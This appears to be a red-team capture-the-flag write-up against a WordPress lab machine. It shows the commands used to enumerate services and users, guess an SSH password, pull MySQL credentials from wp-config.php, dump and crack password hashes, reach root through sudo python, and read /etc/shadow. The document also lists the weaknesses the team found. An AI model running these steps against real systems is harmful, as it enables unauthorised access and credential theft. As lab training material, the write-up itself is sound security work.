


# Red Team: Summary of Operations
Table of Contents:

* Reconnaissance Phase
* Service Abuse 
* Lateral Movement 
* Privilege Escalation
* Critical Vulnerabilities 

# Reconnaissance Phase: it is all about Enumeration!

During the reconnaissance phase on the Target, we used different tools to collect and gather important information about the target.

Tools used during the reconnaissance phase: Nmap, dirb, and wpscan 


We used Nmap to scan the target and enumerate the open ports 

Command used to scan Target 1 Machine: ` nmap -sV -sC 192.168.1.110 `

<img src="/Red Team Summary of Operations/Images/nmap.png" >

This scan identifies the services below as potential points of entry:

|  Port | Service  | 
|---|------|
| 22 |  SSH | 
| 80  | HTTP  |  
| 111  |  rcpbind | 
| 139  | NetBIOS |
| 445 | NetBIOS |

After discovering that the target is a web application running on port 80 we used dirb to enumerate the web application hidden directory.

<img src="/Red Team Summary of Operations/Images/website.png">

Command used: `dirb http://192.168.1.110 /usr/share/dirb/wordlist/small.txt`

<img src="/Red Team Summary of Operations/Images/dirb.png">
     
Using dirb give us new information that website running on WordPress, so we used wpscan to enumerate the users. 


Command used: `wpscan -url 192.168.1.110/wordpress -enumerate u `

<img src="/Red Team Summary of Operations/Images/users_enum2.png">


## Service Abuse: 
During our reconnaissance phase we found out that SSH service is open on port 22 and we discover two users michael and steven, so we abuse this two information we have and try to guess the password of one of the users.

Command used: `ssh michael@192.168.1.110`
password: `michael `

Since we were inside the target machine we were able to collect the first two flags: 
Command used for flag1: 

* `grep -lr flag1 /var/www `
* `cat /var/www/html/service.html | grep flag1 `

<img src="/Red Team Summary of Operations/Images/flag1.png">

Command used for flag2: 

* `locate flag2.txt`
 
* `cat /var/www/flag2.txt`

![flag2](https://user-images.githubusercontent.com/69011745/153727072-1bceb9f7-c7b0-4404-bfe3-df89c5c33950.png)

## Lateral Movement: 
With Michael's credentials we were able to navigate through the file system of the target machine and revealed the root username and password for MySQL database.


File Path: `/var/www/html/wordpress/wp-config.php`

<img src="/Red Team Summary of Operations/Images/password_db.png">

Next, we logged into MySQL and dumped the WordPress user password hashes using the password `R@v3nSecurity` :

Command used:
* `mysql -u root -p` 
* `show DATABASES;`
* `use wordpress;`
* `show tables;`
* `select user_login,user_pass from wp_users;`  

<img src="/Red Team Summary of Operations/Images/mysqlhashes.png">

we got flag3.txt also by:  
* `mysql -u root -p`
* `show DATABASES;`
* `use wordpress;`
* `show tables;`
* `Select * from wp_posts;`

<img src="/Red Team Summary of Operations/Images/flag3.png">

Now we have the password hash for steven, we used john to crack the password hash
Command used:
* `john hash1.txt -w=rockyou.txt ` 
<img src="/Red Team Summary of Operations/Images/CaptureJohn_Steven_Pass.PNG">


## Privilege Escalation
With steven password:`pink84,` we logged into the target machine again and checked his sudo privileges and discovered he had sudo right for python. 
We escalated our privileges from steven to root using python script.


Command used: 
* ssh steven@192.168.1.110 
* sudo -l 
* python -c 'import pty;pty.spawn("/bin/bash");'
* locate flag4.txt 
* cat /root/flag4.txt
<img src="/Red Team Summary of Operations/Images/flag4.png">

As root user, we dumped all user hashes including the root user hash:
Command used:` cat /etc/shadow`

<img src="/Red Team Summary of Operations/Images/all_hashs.png">

## Critical Vulnerabilities Discover During Our Engagement: 

* No firewall rule to block Nmap port scanning 
* Web application Directory enumeration 
* WordPress enumeration
* Poor SSH configuration 
* Weak Password policies 
* No file security permission implementation for critical files system  
* Sudo rights for python used to escalate privilege to root 
